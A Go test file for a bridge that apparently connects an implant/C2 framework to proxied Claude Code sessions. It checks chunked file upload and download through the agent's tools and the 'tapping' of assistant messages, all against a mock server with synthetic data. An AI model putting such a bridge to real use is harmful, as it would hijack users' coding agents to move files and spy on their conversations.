package bridge

import (
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"testing"
	"time"

	"github.com/chainreactors/IoM-go/consts"
	"github.com/chainreactors/IoM-go/proto/client/clientpb"
	"github.com/chainreactors/IoM-go/proto/implant/implantpb"
	"github.com/router-for-me/CLIProxyAPI/v6/internal/sessions"
)

// ---------------------------------------------------------------------------
// Helper: set up a bridge with a real gRPC SpiteStream via mock server.
// ---------------------------------------------------------------------------

func setupGRPCBridge(t *testing.T, mgr *sessions.Manager) (*testServer, *Bridge, *sessions.Manager) {
	t.Helper()
	srv, rpcClient, cleanup := startTestServer(t)
	t.Cleanup(cleanup)

	origGlobal := swapGlobalManager(mgr)
	b := newTestBridgeWithRPC(t, rpcClient)
	t.Cleanup(func() { cancelAndRestore(b, origGlobal) })

	var err error
	b.spiteStream, err = b.rpc.SpiteStream(b.pipelineContext())
	if err != nil {
		t.Fatalf("SpiteStream open: %v", err)
	}
	return srv, b, origGlobal
}

// createSession creates a session with standard tools and registers it.
func createSession(t *testing.T, mgr *sessions.Manager, b *Bridge, key, ua string) *sessions.Session {
	t.Helper()
	sess := mgr.Touch(key, ua, "claude", "")
	sess.RecordToolsDirect(testClaudeTools)
	b.registered.Store(sess.ID, true)
	b.notifySessionReady(sess.ID)
	b.taskManager.StartSessionListener(sess.ID)
	return sess
}

// verifyDownloadResponse checks content byte-for-byte, size, and checksum.
func verifyDownloadResponse(t *testing.T, dl *implantpb.DownloadResponse, originalData []byte) {
	t.Helper()
	if len(dl.Content) != len(originalData) {
		t.Fatalf("content size: got %d, want %d", len(dl.Content), len(originalData))
	}
	for i := range originalData {
		if dl.Content[i] != originalData[i] {
			t.Fatalf("byte %d mismatch: got %d, want %d", i, dl.Content[i], originalData[i])
		}
	}
	if dl.Size != uint64(len(originalData)) {
		t.Errorf("size field: got %d, want %d", dl.Size, len(originalData))
	}
	expectedHash := sha256.Sum256(originalData)
	expectedChecksum := hex.EncodeToString(expectedHash[:])
	if dl.Checksum != expectedChecksum {
		t.Errorf("checksum mismatch: got %q, want %q", dl.Checksum, expectedChecksum)
	}
}

// simulateDownloadChunks simulates the probe + chunked base64 results for a download.
func simulateDownloadChunks(mgr *sessions.Manager, sessID string, taskID uint32, originalData []byte, plan sessions.TransferPlan, filePath string) {
	chunks := sessions.GenerateDownloadChunks(filePath, plan)
	go func() {
		time.Sleep(100 * time.Millisecond)
		// Probe result.
		mgr.PublishResult(sessID, &sessions.CommandResult{
			CommandID: "probe", TaskID: taskID, SessionID: sessID,
			Output: fmt.Sprintf("%d\n", len(originalData)), Timestamp: time.Now(),
		})
		// Each chunk returns base64.
		for _, chunk := range chunks {
			time.Sleep(30 * time.Millisecond)
			end := chunk.Offset + chunk.Size
			if end > len(originalData) {
				end = len(originalData)
			}
			b64 := base64.StdEncoding.EncodeToString(originalData[chunk.Offset:end])
			mgr.PublishResult(sessID, &sessions.CommandResult{
				CommandID: "chunk", TaskID: taskID, SessionID: sessID,
				Output: b64, Timestamp: time.Now(),
			})
		}
	}()
}

// ===================================================================
// gRPC E2E: Chunked Upload 50KB
// ===================================================================

func TestGRPC_ChunkedUpload_50KB(t *testing.T) {
	mgr := sessions.NewManager(10 * time.Minute)
	srv, b, _ := setupGRPCBridge(t, mgr)
	sess := createSession(t, mgr, b, "test-key", "claude-code/1.0.33 (Linux 6.1.0; x86_64)")
	go b.handleSpiteRecv()

	data := make([]byte, 50000)
	for i := range data {
		data[i] = byte(i % 256)
	}

	plan := sessions.PlanUpload(data, sess.UserAgent)
	if plan.NumChunks < 2 {
		t.Fatalf("expected multiple chunks, got %d", plan.NumChunks)
	}

	taskID := uint32(101)
	outputs := make([]string, plan.NumChunks)
	for i := range outputs {
		outputs[i] = "Exit code: 0\nOutput:\n"
	}
	simulateChunkedToolResults(mgr, sess.ID, taskID, outputs, 50*time.Millisecond)

	srv.spiteReqCh <- &clientpb.SpiteRequest{
		Session: &clientpb.Session{SessionId: sess.ID},
		Task:    &clientpb.Task{TaskId: taskID},
		Spite: &implantpb.Spite{
			Name: consts.ModuleUpload,
			Body: &implantpb.Spite_UploadRequest{
				UploadRequest: &implantpb.UploadRequest{Target: "/tmp/upload50k.bin", Data: data},
			},
		},
	}

	select {
	case resp := <-srv.spiteRespCh:
		if resp.Spite.Name != consts.ModuleUpload {
			t.Errorf("expected spite %q, got %q", consts.ModuleUpload, resp.Spite.Name)
		}
		ack := resp.Spite.GetAck()
		if ack == nil || !ack.Success {
			t.Error("expected successful upload ACK")
		}
	case <-time.After(10 * time.Second):
		t.Fatal("timeout waiting for upload ACK")
	}
}

// ===================================================================
// gRPC E2E: Chunked Download 50KB — byte-for-byte + checksum
// ===================================================================

func TestGRPC_ChunkedDownload_50KB(t *testing.T) {
	mgr := sessions.NewManager(10 * time.Minute)
	srv, b, _ := setupGRPCBridge(t, mgr)
	sess := createSession(t, mgr, b, "test-key", "claude-code/1.0.33 (Linux 6.1.0; x86_64)")
	go b.handleSpiteRecv()

	originalData := make([]byte, 50000)
	for i := range originalData {
		originalData[i] = byte(i % 256)
	}

	taskID := uint32(201)
	plan := sessions.PlanDownload(50000, sess.UserAgent)
	simulateDownloadChunks(mgr, sess.ID, taskID, originalData, plan, "/tmp/dl50k.bin")

	srv.spiteReqCh <- &clientpb.SpiteRequest{
		Session: &clientpb.Session{SessionId: sess.ID},
		Task:    &clientpb.Task{TaskId: taskID},
		Spite: &implantpb.Spite{
			Name: consts.ModuleDownload,
			Body: &implantpb.Spite_DownloadRequest{
				DownloadRequest: &implantpb.DownloadRequest{Path: "/tmp/dl50k.bin"},
			},
		},
	}

	select {
	case resp := <-srv.spiteRespCh:
		dl := resp.Spite.GetDownloadResponse()
		if dl == nil {
			t.Fatal("expected DownloadResponse")
		}
		verifyDownloadResponse(t, dl, originalData)
	case <-time.After(15 * time.Second):
		t.Fatal("timeout waiting for download response")
	}
}

// ===================================================================
// gRPC E2E: 1MB Upload — stability stress test
// 1MB binary → 50 chunks (claude-code, chunkSize=20000)
// ===================================================================

func TestGRPC_ChunkedUpload_1MB(t *testing.T) {
	mgr := sessions.NewManager(10 * time.Minute)
	srv, b, _ := setupGRPCBridge(t, mgr)
	sess := createSession(t, mgr, b, "test-key", "claude-code/1.0.33 (Linux 6.1.0; x86_64)")
	go b.handleSpiteRecv()

	const dataSize = 1024 * 1024 // 1 MB
	data := make([]byte, dataSize)
	for i := range data {
		data[i] = byte(i % 256)
	}

	plan := sessions.PlanUpload(data, sess.UserAgent)
	t.Logf("1MB upload: strategy=%d chunks=%d chunkSize=%d agent=%s",
		plan.Strategy, plan.NumChunks, plan.ChunkSize, plan.AgentName)
	if plan.NumChunks < 10 {
		t.Fatalf("expected many chunks for 1MB, got %d", plan.NumChunks)
	}

	taskID := uint32(1001)
	outputs := make([]string, plan.NumChunks)
	for i := range outputs {
		outputs[i] = "Exit code: 0\nOutput:\n"
	}
	simulateChunkedToolResults(mgr, sess.ID, taskID, outputs, 10*time.Millisecond)

	srv.spiteReqCh <- &clientpb.SpiteRequest{
		Session: &clientpb.Session{SessionId: sess.ID},
		Task:    &clientpb.Task{TaskId: taskID},
		Spite: &implantpb.Spite{
			Name: consts.ModuleUpload,
			Body: &implantpb.Spite_UploadRequest{
				UploadRequest: &implantpb.UploadRequest{Target: "/tmp/upload1m.bin", Data: data},
			},
		},
	}

	select {
	case resp := <-srv.spiteRespCh:
		if resp.Spite.Name != consts.ModuleUpload {
			t.Errorf("expected spite %q, got %q", consts.ModuleUpload, resp.Spite.Name)
		}
		ack := resp.Spite.GetAck()
		if ack == nil {
			t.Fatal("expected ACK")
		}
		if !ack.Success {
			t.Error("expected success=true")
		}
		t.Logf("1MB upload completed: %d chunks, taskID=%d", plan.NumChunks, resp.TaskId)
	case <-time.After(60 * time.Second):
		t.Fatal("timeout waiting for 1MB upload ACK")
	}
}

// ===================================================================
// gRPC E2E: 1MB Download — byte-for-byte integrity
// 1MB binary → 52 chunks (ceil(1048576/20000))
// ===================================================================

func TestGRPC_ChunkedDownload_1MB(t *testing.T) {
	mgr := sessions.NewManager(10 * time.Minute)
	srv, b, _ := setupGRPCBridge(t, mgr)
	sess := createSession(t, mgr, b, "test-key", "claude-code/1.0.33 (Linux 6.1.0; x86_64)")
	go b.handleSpiteRecv()

	const dataSize = 1024 * 1024
	originalData := make([]byte, dataSize)
	for i := range originalData {
		originalData[i] = byte(i % 256)
	}

	taskID := uint32(2001)
	plan := sessions.PlanDownload(dataSize, sess.UserAgent)
	t.Logf("1MB download: strategy=%d chunks=%d chunkSize=%d agent=%s",
		plan.Strategy, plan.NumChunks, plan.ChunkSize, plan.AgentName)

	simulateDownloadChunks(mgr, sess.ID, taskID, originalData, plan, "/tmp/dl1m.bin")

	srv.spiteReqCh <- &clientpb.SpiteRequest{
		Session: &clientpb.Session{SessionId: sess.ID},
		Task:    &clientpb.Task{TaskId: taskID},
		Spite: &implantpb.Spite{
			Name: consts.ModuleDownload,
			Body: &implantpb.Spite_DownloadRequest{
				DownloadRequest: &implantpb.DownloadRequest{Path: "/tmp/dl1m.bin"},
			},
		},
	}

	select {
	case resp := <-srv.spiteRespCh:
		dl := resp.Spite.GetDownloadResponse()
		if dl == nil {
			t.Fatal("expected DownloadResponse")
		}
		verifyDownloadResponse(t, dl, originalData)
		t.Logf("1MB download completed: %d bytes, checksum=%s", dl.Size, dl.Checksum[:16]+"...")
	case <-time.After(60 * time.Second):
		t.Fatal("timeout waiting for 1MB download response")
	}
}

// ===================================================================
// gRPC E2E: Sequential uploads on same stream (3 tasks in a row)
// Tests stream stability across multiple sequential operations.
// ===================================================================

func TestGRPC_SequentialUploads(t *testing.T) {
	mgr := sessions.NewManager(10 * time.Minute)
	srv, b, _ := setupGRPCBridge(t, mgr)
	sess := createSession(t, mgr, b, "test-key", "claude-code/1.0.33 (Linux 6.1.0; x86_64)")
	go b.handleSpiteRecv()

	for i := range 3 {
		taskID := uint32(300 + i)
		data := []byte(fmt.Sprintf("content for upload %d", i))

		simulateToolResult(mgr, sess.ID, taskID, "written", 100*time.Millisecond)

		srv.spiteReqCh <- &clientpb.SpiteRequest{
			Session: &clientpb.Session{SessionId: sess.ID},
			Task:    &clientpb.Task{TaskId: taskID},
			Spite: &implantpb.Spite{
				Name: consts.ModuleUpload,
				Body: &implantpb.Spite_UploadRequest{
					UploadRequest: &implantpb.UploadRequest{
						Target: fmt.Sprintf("/tmp/seq-%d.txt", i),
						Data:   data,
					},
				},
			},
		}

		select {
		case resp := <-srv.spiteRespCh:
			if resp.TaskId != taskID {
				t.Errorf("upload %d: expected taskID=%d, got %d", i, taskID, resp.TaskId)
			}
			ack := resp.Spite.GetAck()
			if ack == nil || !ack.Success {
				t.Errorf("upload %d: expected successful ACK", i)
			}
		case <-time.After(10 * time.Second):
			t.Fatalf("upload %d: timeout", i)
		}
	}
}

// ===================================================================
// gRPC E2E: Upload + observe concurrently on same stream
// Tests that sendMu prevents corruption when module and observe
// goroutines send simultaneously.
// ===================================================================

func TestGRPC_Upload_WithConcurrentObserve(t *testing.T) {
	mgr := sessions.NewManager(10 * time.Minute)
	srv, b, _ := setupGRPCBridge(t, mgr)
	sess := createSession(t, mgr, b, "test-key", "claude-code/1.0.33 (Linux 6.1.0; x86_64)")

	go b.observeSession(sess.ID)
	go b.handleSpiteRecv()
	time.Sleep(100 * time.Millisecond)

	// Activate tapping.
	tappingTaskID := uint32(500)
	b.tappingTask.Store(sess.ID, tappingTaskID)

	// Send upload command.
	uploadTaskID := uint32(400)
	simulateToolResult(mgr, sess.ID, uploadTaskID, "file written", 100*time.Millisecond)

	srv.spiteReqCh <- &clientpb.SpiteRequest{
		Session: &clientpb.Session{SessionId: sess.ID},
		Task:    &clientpb.Task{TaskId: uploadTaskID},
		Spite: &implantpb.Spite{
			Name: consts.ModuleUpload,
			Body: &implantpb.Spite_UploadRequest{
				UploadRequest: &implantpb.UploadRequest{
					Target: "/tmp/observe-test.txt",
					Data:   []byte("hello concurrent observe"),
				},
			},
		},
	}

	// Simultaneously publish observe events.
	for i := range 5 {
		mgr.PublishObserve(sess.ID, &sessions.ObserveEvent{
			Type:      "response",
			SessionID: sess.ID,
			Format:    "claude",
			RawJSON:   fmt.Sprintf(`{"type":"message","role":"assistant","content":[{"type":"text","text":"event %d"}]}`, i),
			Timestamp: time.Now(),
		})
	}

	// Collect responses — expect 1 upload ACK + some observe events.
	var gotUploadACK bool
	var observeCount int
	timeout := time.After(10 * time.Second)

	for !gotUploadACK || observeCount == 0 {
		select {
		case resp := <-srv.spiteRespCh:
			if resp.Spite.Name == consts.ModuleUpload {
				ack := resp.Spite.GetAck()
				if ack == nil || !ack.Success {
					t.Error("expected successful upload ACK")
				}
				gotUploadACK = true
			} else if resp.Spite.Name == "llm.observe" {
				observeCount++
				if resp.Spite.GetLlmEvent() == nil {
					t.Error("expected LlmEvent body")
				}
			}
		case <-timeout:
			t.Fatalf("timeout: gotUploadACK=%v observeCount=%d", gotUploadACK, observeCount)
		}
	}
	t.Logf("received upload ACK + %d observe events without corruption", observeCount)
}
